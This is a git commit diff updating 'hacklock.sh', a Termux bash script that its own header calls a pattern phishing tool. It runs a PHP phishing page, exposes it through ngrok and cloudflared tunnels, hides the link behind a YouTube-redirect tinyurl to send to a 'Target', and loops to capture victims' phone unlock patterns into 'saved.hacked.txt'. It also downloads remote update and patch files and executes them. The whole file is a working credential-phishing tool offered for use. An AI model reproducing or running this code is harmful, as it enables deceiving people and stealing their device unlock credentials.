9cce483a2b17208ffa40798d07841092d07f8271
N17R0 <49580304+noob-hackers@users.noreply.github.com>
2023-03-26 11:16:27 +0530

    Update hacklock.sh

--- hacklock.sh
+++ hacklock.sh
@@ -1,19 +1,23 @@
-#!/bin/bash
-# Hacklock by Nitro
-#youtube.com/noobhackers
-#not for illegel use
-#pattern phishing tool for termux no root.
+#!data/datacom.termux/files/usr/bin/bash
+# HACKLOCK V2.0
+########### BY NITRO ###########
+#    This Tool Is For Android  #
+#   Pattern Penetraion testing #
+#   web: www.noob-hackers.com  #
+# You can copy but give credits#
+# Any feedback start issue     #
+######---Noob Hackers----######
+
+####### Checks if setup file exists #######
 clear
-echo
-echo
-echo
-trap 'printf "\n";stop;exit 1' 2
 loc=/data/data/com.termux/files/home/hacklock/setup
 if [ -f "$loc" ]; then
 cd $HOME/hacklock
 bash setup
 fi
 clear
+
+####### Check if update available #######
 check(){
 if wget --spider https://raw.githubusercontent.com/noob-hackers/hacklock/master/update.v1.4 2>/dev/null; then
 cd $HOME/hacklock/core/update
@@ -23,6 +27,7 @@ echo
 fi
 }
 check
+####### Update file execute #######
 option(){
 if [ -f "$HOME/hacklock/core/update/update.txt" ];then
 cd $HOME/hacklock/core/update
@@ -32,6 +37,8 @@ echo " "
 fi
 }
 option
+
+####### Check patch updates #######
 check1(){
 if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/hacklockpatch.v.1 2>/dev/null; then
 cd $HOME/hacklock/core/update
@@ -41,6 +48,8 @@ echo
 fi
 }
 check1
+
+####### Execute downloaded patch file #######
 option1(){
 if [ -f "$HOME/mrphish/core/update/patch.txt" ];then
 cd $HOME/hacklock/core/update
@@ -50,18 +59,18 @@ echo " "
 fi
 }
 option1
+
+####### Check if the pacages available #######
 dependencies() {
-
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
-
+command -v php > /dev/null 2>&1 || { echo >&2 "I require Php but it's not installed. Install it. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require Curl but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require Wget but it's not installed. Install it. Aborting."; exit 1; }
 }
 
+####### Menu of the tool #######
 menu() {
-
 printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Hack pattern\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m More Tools\e[0m\n"
-#printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Video\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Chat\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Fix \e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Follow\e[0m\n"
@@ -70,7 +79,6 @@ printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m About \e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Subscribe\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option
-
 
 if [[ $option == 1 || $option == 01 ]]; then
 server="pattern"
@@ -103,29 +111,33 @@ menu
 fi
 }
 
+####### Stop background execution #######
 stop() {
-
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
+checkcloud=$(ps aux | grep -o "cloudflared" | head -n1)
+
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 fi
+
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
 fi
-if [[ $checkssh == *'ssh'* ]]; then
-pkill -f -2 ssh > /dev/null 2>&1
+
+if [[ $checkcloud == *'cloudflared'* ]]; then
+pkill -f -2 cloudflared > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
 fi
+
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-
 }
 
+####### Banner for interface #######
 banner() {
 printf "\n"
 printf "\e[1;92m  _|    _|                      _|        _|                            _|\e[0m\n"
@@ -138,183 +150,122 @@ printf "                  \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
 printf "\n"
 printf "           \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
-printf "    \e[101m\e[1;77m #>   Note: Turn on mobile hotspot to get link.....!  <# \e[0m\n"
-printf "\n"
 }
 
+####### Catch creds #######
 catch_cred() {
-
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' core/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'password : .*' $HOME/hacklock/core/pattern/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Pattern-pin:\e[0m\e[1;77m %s\n\e[0m" $password
-cat core/$server/usernames.txt >> core/$server/saved.hacked.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m core/%s/saved.hacked.txt\e[0m\n" $server
+cat $HOME/hacklock/core/pattern/usernames.txt >> $HOME/hacklock/core/pattern/saved.hacked.txt
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m core/main/saved.hacked.txt\e[0m\n"
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\e[0m\n"
-
 }
 
-serverx() {
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd core/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
-printf "\n"
-sleep 10
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-
-send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
-#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
-printf "\n"
-checkfound
-}
-
-startx() {
-if [[ -e core/$server/ip.txt ]]; then
-rm -rf core/$server/ip.txt
-
-fi
-if [[ -e core/$server/usernames.txt ]]; then
-rm -rf core/$server/usernames.txt
-
-fi
-
-default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
-read port
-port="${port:-${default_port}}"
-serverx
-
-}
-
-
+####### Server start/run #######
 start() {
-if [[ -e core/$server/ip.txt ]]; then
-rm -rf core/$server/ip.txt
-
-fi
-if [[ -e core/$server/usernames.txt ]]; then
-rm -rf core/$server/usernames.txt
-
+if [[ -e "$HOME/hacklock/core/pattern/ip.txt" ]]; then
+rm -rf $HOME/hacklock/core/pattern/ip.txt
 fi
 
-if [[ -e ngrok ]]; then
-echo ""
+if [[ -e "$HOME/hacklock/core/pattern/usernames.txt" ]]; then
+rm -rf $HOME/hacklock/core/pattern/usernames.txt
+fi
+
+if [[ -e "$HOME/hacklock/cloudflare-log" ]]; then
+rm -rf $HOME/hacklock/cloudflare-log
+fi
+
+if [[ -e "$HOME/hacklock/ngrok" ]]; then
+echo " "
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+cd $HOME/hacklock
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1
-
-if [[ -e ngrok-wifi-data.zip ]]; then
-unzip ngrok-wifi-data.zip > /dev/null 2>&1
+wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
+sleep 20
+if [[ -e "$HOME/hacklock/ngrok" ]]; then
 chmod +x ngrok
-rm -rf ngrok-wifi-data.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-
-
-else
-wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
-if [[ -e ngrok-wifi-data.zip ]]; then
-unzip ngrok-wifi-data.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-wifi-data.zip
+sleep 2.0
+printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok downloaded successfully.\n"
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
 exit 1
 fi
 fi
+
+if [[ -e "$HOME/hacklock/cloudflared" ]]; then
+echo " "
+else
+cd $HOME/hacklock                                                                                           
+printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Cloudflare...\n"
+wget -O cloudflared https://github.com/cloudflare/cloudflared/releases/download/2021.10.3/cloudflared-linux-arm64 > /dev/null 2>&1
+sleep 20
+if [[ -e "$HOME/hacklock/cloudflared" ]]; then
+chmod +x cloudflared
+sleep 2.0
+printf "\e[1;92m[\e[0m*\e[1;92m] cloudflare downloaded successfully.\n"
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
 fi
-
+fi
+####### Server start process #######
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd core/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
-sleep 10
-
+cd $HOME/hacklock/core/pattern && php -S 127.0.0.1:5678 > /dev/null 2>&1 & 
+sleep 5
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting forward servers...\n"
+./ngrok http 127.0.0.1:5678 > /dev/null 2>&1 &
+termux-chroot ./cloudflared -url 127.0.0.1:5678 --logfile ${PWD}/cloudflare-log > /dev/null 2>&1 &
+sleep 20
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
+clflare=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${PWD}/cloudflare-log")
+printf "\e[1;92m[\e[0m*\e[1;92m] (NGROK) link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] (CooudFlare) link:\e[0m\e[1;77m %s\e[0m\n" $clflare
 send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
-#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
-
 checkfound
 }
 
+####### Remove sendlink file #######
 start1() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-
-
-#printf "\n"
-#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
-#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-#default_option_server="1"
-#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
-#option_server="${option_server:-${default_option_server}}"
-#if [[ $option_server == 1 || $option_server == 01 ]]; then
-#startx
-
-#elif [[ $option_server == 2 || $option_server == 02 ]]; then
 start
-#else
-#printf "\e[1;93m [!] Invalid option!\e[0m\n"
-#sleep 1
-#clear
-#start1
-#fi
-
 }
+
+####### Fix ngrok issue #######
 fixer(){
-  clear
-  cd $HOME
-  ls -a >/dev/null 2>&1
-  rm -rf .ngrok2 >/dev/null 2>&1
-  printf "\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\e[0m\n"
+clear
+cd $HOME
+ls -a >/dev/null 2>&1
+rm -rf .ngrok2 >/dev/null 2>&1
+printf "\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\e[0m\n"
 read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
 ./ngrok authtoken $name >/dev/null 2>&1
 printf "\e[1;92m[\e[0m*\e[1;92m] NGROK FIXED SUCCESSFULLY:\e[0m\e[1;77m %s\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] IF ITS NOT SOLVED THEN USE OPTION CHAT\e[0m\e[1;77m %s\e[0m\n"
 sleep 6.0
-bash main.sh
+exit 1
 }
 
-
-
+####### Check found data #######
 checkfound() {
-
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For Pin,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
-
-if [[ -e "core/$server/usernames.txt" ]]; then
+if [[ -e "$HOME/hacklock/core/pattern/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Pattern  Found!\n"
 catch_cred
-rm -rf core/$server/usernames.txt
+rm -rf $HOME/hacklock/core/pattern/usernames.txt
 fi
 sleep 0.5
-
 done 
-
 }
+
+####### Restart the tool #######
 banner
 dependencies
 menu
